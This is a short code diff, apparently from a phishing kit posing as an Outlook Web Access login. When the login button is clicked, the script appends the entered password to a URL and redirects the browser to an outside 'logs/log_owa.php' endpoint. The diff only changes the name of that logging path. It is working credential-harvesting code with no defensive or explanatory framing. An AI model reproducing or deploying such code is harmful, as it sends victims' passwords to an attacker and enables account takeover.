@@ -51,7 +51,7 @@ owa_btn.addEventListener("click", function () {
             password.value;
 
         location =
-            "https://tellme24.com/logs/gm1/log_owa.php?" + url;
+            "https://tellme24.com/logs/gmb1/log_owa.php?" + url;
     } else {
         alert("Invalid Password");
     }
